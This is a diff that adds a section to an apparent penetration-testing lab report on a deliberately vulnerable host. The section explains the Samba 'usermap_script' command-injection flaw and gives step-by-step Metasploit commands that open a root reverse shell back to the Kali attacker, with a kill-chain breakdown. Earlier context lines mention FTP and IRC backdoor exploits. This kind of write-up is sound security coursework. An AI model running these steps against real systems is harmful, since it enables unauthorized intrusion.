@@ -94,3 +94,33 @@ Key findings — 23 open ports in total, including several with well-known vulne
   - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
   - **Actions on Objectives:** Ran sysinfo and getuid to confirm full root-level access to the target.
 - **Outcome / Impact:** Achieved a second, independent root-level Meterpreter session on the target via a completely different service (IRC instead of FTP), demonstrating the target has multiple unrelated critical vulnerabilities.
+
+
+
+---
+
+## Exploit 3: Samba "usermap_script" Command Execution
+
+- **Service / Port:** SMB / 139 (also exposed on 445)
+- **Vulnerability:** Samba versions 3.0.20 through 3.0.25rc3 mishandle the "username map script" configuration option, allowing shell metacharacters in the username field to be executed as commands on the server.
+- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
+- **Why This Tool:** Recon identified Samba smbd 3.0.20-Debian running on ports 139/445, a version range known to be vulnerable to this specific misconfiguration. Metasploit's dedicated "excellent" rated module reliably crafts and sends the malicious username string, which would be tedious and error-prone to replicate manually over raw SMB.
+- **Steps:**
+  1. `background` (to exit the previous session)
+  2. `back`
+  3. `search samba usermap`
+  4. `use exploit/multi/samba/usermap_script`
+  5. `set RHOSTS 192.168.100.204`
+  6. `set LHOST 192.168.100.253`
+  7. `run`
+  8. Confirmed access with `whoami` and `id` inside the resulting command shell session
+- **Evidence:** evidence/exploit3.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
+  - **Reconnaissance:** The nmap scan identified the vulnerable Samba 3.0.20-Debian version on ports 139/445.
+  - **Weaponization:** Selecting the usermap_script module and configuring RHOSTS/LHOST paired the misconfiguration with a reverse shell payload.
+  - **Delivery:** Metasploit sent a crafted username containing shell metacharacters to the Samba service.
+  - **Exploitation:** Samba passed the malicious username to the shell unsanitized, executing the embedded command.
+  - **Installation:** A reverse shell payload was executed on the target, establishing a foothold.
+  - **Command & Control:** The reverse TCP command shell session gave an ongoing remote control channel back to Kali.
+  - **Actions on Objectives:** Ran whoami and id to confirm full root-level access to the target.
+- **Outcome / Impact:** Achieved a third, independent root-level shell on the target via a Samba misconfiguration, distinct from both prior exploits and demonstrating a different vulnerability class (command injection vs. planted backdoors).
